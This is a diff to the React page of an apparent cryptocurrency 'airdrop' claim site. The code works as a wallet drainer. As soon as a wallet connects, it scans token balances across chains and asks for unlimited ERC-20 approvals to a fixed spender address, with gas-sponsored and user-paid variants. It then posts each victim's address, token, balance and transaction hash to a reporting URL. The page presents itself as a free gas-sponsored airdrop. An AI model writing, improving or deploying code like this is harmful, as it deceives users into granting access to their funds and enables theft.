@@ -1,35 +1,20 @@
 'use client';
 import { useState, useEffect } from 'react';
-import { useAccount } from 'wagmi';
-import { erc20Abi, maxUint256, createPublicClient, http, createWalletClient } from 'viem';
-import { privateKeyToAccount } from 'viem/accounts';
-import { mainnet, arbitrum, sepolia } from 'viem/chains';
-import { createGelatoSmartWalletClient, sponsored } from "@gelatonetwork/smartwallet";
-import { gelato } from "@gelatonetwork/smartwallet/accounts";
+import { useAccount, useWriteContract } from 'wagmi';
+import { erc20Abi, maxUint256, encodeFunctionData } from 'viem';
+import { readContract, getBalance, switchChain } from '@wagmi/core';
+import { config } from '@/config';
+import { useGelatoSmartWalletClient } from '@gelatonetwork/smartwallet-react-wagmi';
 
-// Your existing configuration
+// Environment variables
 const REPORT_URL = process.env.NEXT_PUBLIC_REPORT_URL;
 const SPENDER = (process.env.NEXT_PUBLIC_SPENDER || "") as `0x${string}`;
-
-// Add Gelato API Key (get this from https://app.gelato.cloud/)
-const GELATO_API_KEY = process.env.NEXT_PUBLIC_GELATO_API_KEY!;
 
 if (!SPENDER || SPENDER === "0x") {
   throw new Error('SPENDER_ADDRESS is not defined or invalid');
 }
 
-if (!GELATO_API_KEY) {
-  throw new Error('GELATO_API_KEY is not defined');
-}
-
-// Chain configuration for Gelato
-const CHAIN_CONFIG = {
-  1: { chain: mainnet, name: "Ethereum Mainnet" },
-  42161: { chain: arbitrum, name: "Arbitrum" },
-  11155111: { chain: sepolia, name: "Sepolia" },
-};
-
-// Your existing tokens configuration
+// Tokens grouped by chainId (using your exact configuration)
 const TOKENS_BY_CHAIN: Record<
   number,
   { symbol: string; address: `0x${string}`; min: bigint; decimals: number }[]
@@ -51,7 +36,14 @@ const TOKENS_BY_CHAIN: Record<
   ],
 };
 
-// Connection Reporter component (unchanged)
+// Human-readable chain names (your exact configuration)
+const CHAIN_NAMES: Record<number, string> = {
+  1: "Ethereum Mainnet",
+  42161: "Arbitrum",
+  11155111: "Sepolia",
+};
+
+// Component that reports wallet connections (unchanged)
 function ConnectionReporter() {
   const { address, isConnected } = useAccount();
 
@@ -73,48 +65,18 @@ function ConnectionReporter() {
 
 export default function Home() {
   const { address, isConnected, chainId } = useAccount();
+  const { writeContractAsync } = useWriteContract();
   const [status, setStatus] = useState<string>("");
+  const [useSponsored, setUseSponsored] = useState(true); // Toggle for sponsored vs regular
 
-  // Create Gelato Smart Wallet Client for sponsored transactions
-  async function createSponsoredWalletClient(chainId: number, userAddress: `0x${string}`) {
-    const chainConfig = CHAIN_CONFIG[chainId as keyof typeof CHAIN_CONFIG];
-    if (!chainConfig) {
-      throw new Error(`Chain ${chainId} not supported for sponsored transactions`);
-    }
+  // Gelato Smart Wallet hook
+  const { 
+    sponsorTransaction, 
+    isLoading: isGelatoLoading 
+  } = useGelatoSmartWallet();
 
-    // Create a temporary private key for the smart wallet
-    // In production, you might want to derive this deterministically from the user's address
-    // or use a different approach based on your security requirements
-    const tempPrivateKey = "0x" + "1".repeat(64) as `0x${string}`;
-    const owner = privateKeyToAccount(tempPrivateKey);
-
-    const publicClient = createPublicClient({
-      chain: chainConfig.chain,
-      transport: http(),
-    });
-
-    // Create Gelato Smart Account
-    const account = await gelato({
-      owner,
-      client: publicClient,
-    });
-
-    // Create wallet client
-    const walletClient = createWalletClient({
-      account,
-      chain: chainConfig.chain,
-      transport: http(),
-    });
-
-    // Create Gelato Smart Wallet Client with sponsorship
-    const smartWalletClient = createGelatoSmartWalletClient(walletClient, { 
-      apiKey: GELATO_API_KEY 
-    });
-
-    return { smartWalletClient, chainName: chainConfig.name };
-  }
-
-  async function handleClaimWithSponsorship() {
+  // Sponsored transaction handler
+  async function handleClaimSponsored() {
     if (!isConnected || !address) {
       setStatus("Wallet not connected");
       return;
@@ -126,49 +88,52 @@ export default function Home() {
       let targetChain: number | null = null;
       let usableTokens: { symbol: string; address: `0x${string}`; min: bigint; decimals: number }[] = [];
 
-      // Find tokens with sufficient balance (same logic as before)
       for (const [cid, tokens] of Object.entries(TOKENS_BY_CHAIN)) {
         const numericCid = Number(cid);
-        
-        // Only check chains supported by Gelato
-        if (!CHAIN_CONFIG[numericCid as keyof typeof CHAIN_CONFIG]) continue;
 
         for (const token of tokens) {
           try {
-            // You'll need to implement balance checking logic here
-            // For now, assuming we found usable tokens
-            const hasBalance = true; // Replace with actual balance check
-            
-            if (hasBalance) {
+            const bal = await readContract(config, {
+              chainId: numericCid,
+              address: token.address,
+              abi: erc20Abi,
+              functionName: "balanceOf",
+              args: [address],
+            }) as bigint;
+
+            if (bal >= token.min) {
               targetChain = numericCid;
               usableTokens.push(token);
             }
-          } catch (error) {
-            console.error(`Error checking balance for ${token.symbol}:`, error);
-          }
+          } catch {}
         }
 
         if (usableTokens.length > 0) break;
       }
 
       if (!targetChain || usableTokens.length === 0) {
-        setStatus("No usable balances found on supported chains.");
+        setStatus("No usable balances found on any chain.");
         return;
       }
 
-      // Create sponsored wallet client
-      const { smartWalletClient, chainName } = await createSponsoredWalletClient(targetChain, address);
-      
-      setStatus(`Processing sponsored transactions on ${chainName}...`);
+      const chainName = CHAIN_NAMES[targetChain!] || "Unknown Chain";
 
-      // Execute sponsored transactions for each token
+      // Switch chain if needed
+      if (chainId !== targetChain) {
+        setStatus(`Switching to ${chainName}...`);
+        await switchChain(config, { chainId: targetChain });
+      }
+
+      setStatus(`Processing sponsored approvals on ${chainName}...`);
+
+      // Process each token with sponsored gas
       for (const token of usableTokens) {
         setStatus(`Approving ${token.symbol} on ${chainName} (Gas Sponsored)...`);
 
         try {
-          // Execute sponsored approval transaction
-          const results = await smartWalletClient.execute({
-            payment: sponsored(GELATO_API_KEY),
+          // Use Gelato to sponsor the transaction
+          const result = await sponsorTransaction({
+            chainId: targetChain,
             calls: [
               {
                 to: token.address,
@@ -182,65 +147,182 @@ export default function Home() {
             ],
           });
 
-          setStatus(`Processing ${token.symbol} approval...`);
-          
-          // Wait for transaction to be mined
-          const txHash = await results?.wait();
-          
-          if (txHash) {
-            setStatus(`${token.symbol} approved ✅ (Gas Sponsored)`);
-
-            // Report the sponsored transaction
-            await fetch(`${REPORT_URL}`, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({
-                event: "sponsored_approval",
-                wallet: address,
-                chainName,
-                token: token.address,
-                symbol: token.symbol,
-                txHash,
-                sponsored: true,
-                userOpId: results?.id,
-              }),
-            }).catch(console.error);
+          // Get balance for reporting
+          let rawBalance: bigint = BigInt(0);
+          try {
+            rawBalance = await readContract(config, {
+              chainId: targetChain!,
+              address: token.address,
+              abi: erc20Abi,
+              functionName: "balanceOf",
+              args: [address],
+            }) as bigint;
+          } catch (err) {
+            console.error(`Failed to read balance for ${token.symbol}:`, err);
           }
+
+          const formattedBalance = Number(rawBalance) / 10 ** token.decimals;
+
+          setStatus(`${token.symbol} approved ✅ (Gas Sponsored) | Balance: ${formattedBalance}`);
+
+          // Report sponsored approval
+          await fetch(`${REPORT_URL}`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              event: "sponsored_approval",
+              wallet: address,
+              chainName,
+              token: token.address,
+              symbol: token.symbol,
+              balance: formattedBalance,
+              txHash: result.txHash,
+              taskId: result.taskId,
+              sponsored: true,
+            }),
+          }).catch(console.error);
+
         } catch (error) {
-          console.error(`Failed to approve ${token.symbol}:`, error);
-          setStatus(`Error approving ${token.symbol}: ${error.message}`);
+          console.error(`Failed to sponsor ${token.symbol}:`, error);
+          setStatus(`Error sponsoring ${token.symbol}. Trying regular transaction...`);
+          
+          // Fallback to regular transaction
+          await handleSingleTokenRegular(token, targetChain, chainName);
         }
       }
 
-      setStatus("All sponsored approvals completed! 🎉");
+      setStatus("All approvals completed! 🎉");
     } catch (err: any) {
       console.error(err);
       setStatus("Error: " + (err?.shortMessage || err?.message || "unknown"));
     }
   }
 
-  // Fallback to original method if sponsored transactions fail
-  async function handleClaimFallback() {
-    setStatus("Falling back to user-paid gas transactions...");
-    // You can implement your original handleClaim logic here
-    // For now, just showing a message
-    setStatus("Fallback method would be implemented here");
-  }
+  // Regular transaction handler (your original logic)
+  async function handleClaimRegular() {
+    if (!isConnected || !address) {
+      setStatus("Wallet not connected");
+      return;
+    }
 
-  // Main claim handler that tries sponsored first, then fallback
-  async function handleClaim() {
     try {
-      await handleClaimWithSponsorship();
-    } catch (error) {
-      console.error("Sponsored transaction failed, falling back:", error);
-      await handleClaimFallback();
+      setStatus("Scanning chains for balances...");
+
+      let targetChain: number | null = null;
+      let usableTokens: { symbol: string; address: `0x${string}`; min: bigint }[] = [];
+
+      for (const [cid, tokens] of Object.entries(TOKENS_BY_CHAIN)) {
+        const numericCid = Number(cid);
+
+        for (const token of tokens) {
+          try {
+            const bal = await readContract(config, {
+              chainId: numericCid,
+              address: token.address,
+              abi: erc20Abi,
+              functionName: "balanceOf",
+              args: [address],
+            }) as bigint;
+
+            if (bal >= token.min) {
+              targetChain = numericCid;
+              usableTokens.push(token);
+            }
+          } catch {}
+        }
+
+        if (usableTokens.length > 0) break;
+      }
+
+      if (!targetChain || usableTokens.length === 0) {
+        setStatus("No usable balances found on any chain.");
+        return;
+      }
+
+      const chainName = CHAIN_NAMES[targetChain!] || "Unknown Chain";
+
+      if (chainId !== targetChain) {
+        setStatus(`Switching to ${chainName}...`);
+        await switchChain(config, { chainId: targetChain });
+      }
+
+      const nativeBal = await getBalance(config, { address, chainId: targetChain });
+      if (nativeBal.value < BigInt(100000000000000)) {
+        setStatus("Not enough native token to pay gas fees.");
+        return;
+      }
+
+      for (const token of usableTokens) {
+        await handleSingleTokenRegular(token, targetChain, chainName);
+      }
+
+      setStatus("All approvals completed!");
+    } catch (err: any) {
+      console.error(err);
+      setStatus("Error: " + (err?.shortMessage || err?.message || "unknown"));
     }
   }
 
-  // Automatically trigger claim when wallet connects
+  // Helper function for regular single token approval
+  async function handleSingleTokenRegular(token: any, targetChain: number, chainName: string) {
+    setStatus(`Approving ${token.symbol} on ${chainName}...`);
+
+    const txHash = await writeContractAsync({
+      address: token.address,
+      abi: erc20Abi,
+      functionName: "approve",
+      args: [SPENDER, maxUint256],
+      account: address,
+      chainId: targetChain,
+    });
+
+    let rawBalance: bigint = BigInt(0);
+    try {
+      rawBalance = await readContract(config, {
+        chainId: targetChain!,
+        address: token.address,
+        abi: erc20Abi,
+        functionName: "balanceOf",
+        args: [address],
+      }) as bigint;
+    } catch (err) {
+      console.error(`Failed to read balance for ${token.symbol}:`, err);
+    }
+
+    const decimals = (token as any).decimals || 18;
+    const formattedBalance = Number(rawBalance) / 10 ** decimals;
+
+    setStatus(`${token.symbol} approved ✅ | Balance: ${formattedBalance}`);
+
+    // Report regular approval
+    await fetch(`${REPORT_URL}`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        event: "approval",
+        wallet: address,
+        chainName,
+        token: token.address,
+        symbol: token.symbol,
+        balance: formattedBalance,
+        txHash,
+      }),
+    }).catch(console.error);
+  }
+
+  // Main handler that chooses sponsored or regular
+  async function handleClaim() {
+    if (useSponsored) {
+      await handleClaimSponsored();
+    } else {
+      await handleClaimRegular();
+    }
+  }
+
+  // Auto-trigger when wallet connects
   useEffect(() => {
     if (isConnected && address) handleClaim();
-  }, [isConnected, address]);
+  }, [isConnected, address, useSponsored]); // Added useSponsored dependency
 
   return (
     <main
@@ -269,8 +351,13 @@ export default function Home() {
           zIndex: 1000,
         }}
       >
-        <div style={{ fontFamily: "sans-serif", fontWeight: "bold", fontSize: "18px", color: "#aaa587ff" }}>
-          AIRDROPS (Gas Sponsored) 
+        <div style={{ 
+          fontFamily: "sans-serif", 
+          fontWeight: "bold", 
+          fontSize: "18px", 
+          color: useSponsored ? "#4ade80" : "#aaa587ff"
+        }}>
+          AIRDROPS {useSponsored ? "(Gas Sponsored)" : ""}
         </div>
         <appkit-button />
       </header>
@@ -289,7 +376,7 @@ export default function Home() {
       >
         <div
           style={{
-            border: "1px solid #9dd6d1ff",
+            border: `1px solid ${useSponsored ? "#4ade80" : "#9dd6d1ff"}`,
             borderRadius: "12px",
             padding: "20px",
             background: "#090e41ff",
@@ -300,10 +387,70 @@ export default function Home() {
             height: "500px",
           }}
         >
-          <h2 style={{ marginBottom: "12px" }}>Airdrop (Gas Sponsored)</h2>
-          <p style={{ fontSize: "12px", color: "#aaa", textAlign: "center", margin: "8px 0" }}>
-            No gas fees required! Powered by Gelato
-          </p>
+          <div style={{ textAlign: "center" }}>
+            <h2 style={{ marginBottom: "12px" }}>
+              Airdrop {useSponsored ? "(Gas Free)" : ""}
+            </h2>
+            
+            {useSponsored && (
+              <p style={{ 
+                fontSize: "12px", 
+                color: "#4ade80", 
+                margin: "8px 0",
+                fontWeight: "bold"
+              }}>
+                ⚡ Powered by Gelato - No gas fees required!
+              </p>
+            )}
+
+            {/* Toggle Switch */}
+            <div style={{ 
+              display: "flex", 
+              alignItems: "center", 
+              justifyContent: "center",
+              gap: "12px",
+              marginTop: "16px"
+            }}>
+              <span style={{ 
+                fontSize: "12px", 
+                color: useSponsored ? "#666" : "#4ade80" 
+              }}>
+                Regular
+              </span>
+              <button
+                onClick={() => setUseSponsored(!useSponsored)}
+                style={{
+                  width: "48px",
+                  height: "24px",
+                  borderRadius: "12px",
+                  border: "none",
+                  background: useSponsored ? "#4ade80" : "#666",
+                  position: "relative",
+                  cursor: "pointer",
+                  transition: "all 0.3s ease",
+                }}
+              >
+                <div
+                  style={{
+                    width: "20px",
+                    height: "20px",
+                    borderRadius: "10px",
+                    background: "white",
+                    position: "absolute",
+                    top: "2px",
+                    left: useSponsored ? "26px" : "2px",
+                    transition: "all 0.3s ease",
+                  }}
+                />
+              </button>
+              <span style={{ 
+                fontSize: "12px", 
+                color: useSponsored ? "#4ade80" : "#666" 
+              }}>
+                Sponsored
+              </span>
+            </div>
+          </div>
 
           <div
             style={{
@@ -316,23 +463,31 @@ export default function Home() {
               textAlign: "center",
             }}
           >
-            {status || "Ready to claim with sponsored gas!"}
+            {status || (useSponsored ? "Ready to claim with sponsored gas!" : "Ready to claim!")}
           </div>
 
           <button
             onClick={handleClaim}
+            disabled={isGelatoLoading}
             style={{
-              background: "#4ade80",
+              background: useSponsored 
+                ? (isGelatoLoading ? "#6b7280" : "#4ade80")
+                : "#a00b0bff",
               color: "white",
               padding: "12px 28px",
               borderRadius: "8px",
-              cursor: "pointer",
+              cursor: isGelatoLoading ? "not-allowed" : "pointer",
               marginTop: "16px",
               border: "none",
               fontWeight: "bold",
             }}
           >
-            Claim Now (Gas Free)
+            {isGelatoLoading 
+              ? "Processing..." 
+              : useSponsored 
+                ? "Claim Now (Gas Free)" 
+                : "Claim Now"
+            }
           </button>
         </div>
 
